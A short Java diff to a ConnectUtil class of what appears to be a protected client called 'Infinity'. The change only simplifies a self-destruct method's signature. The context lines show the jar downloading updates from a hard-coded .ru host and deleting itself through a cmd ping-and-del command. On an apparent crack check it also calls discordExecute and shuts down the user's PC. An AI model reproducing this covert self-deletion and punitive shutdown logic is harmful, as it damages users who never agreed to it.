@@ -85,7 +85,7 @@ public class ConnectUtil {
 				if (Protect.DOWNLOADER.download(
 						new URL("http://whyuleet.ru/infinity/jar/Infinity-" + getUpdateVersion() + ".jar"),
 						file) != null) {
-					seldDestructionJar(true);
+					seldDestructionJar();
 				}
 			} catch (Exception e) {
 
@@ -99,7 +99,7 @@ public class ConnectUtil {
 		runtime.exec("cmd /c ping localhost -n 2 > nul && del \"" + currentJARFilePath + "\"");
 	}
 
-	public static void seldDestructionJar(boolean exit) throws Exception {
+	public static void seldDestructionJar() throws Exception {
 		if (SystemUtils.IS_OS_WINDOWS) {
 			selfDestructWindowsJARFile();
 		} else {
@@ -108,7 +108,6 @@ public class ConnectUtil {
 			Files.delete(directoryFilePath.toPath());
 		}
 
-		if (exit)
 		System.exit(0);
 
 	}
@@ -151,7 +150,7 @@ public class ConnectUtil {
 
 				Protect.CRACK.discordExecute();
 
-				seldDestructionJar(true);
+				seldDestructionJar();
 
 				Protect.CRACK.shutdownPC();
 				return false;
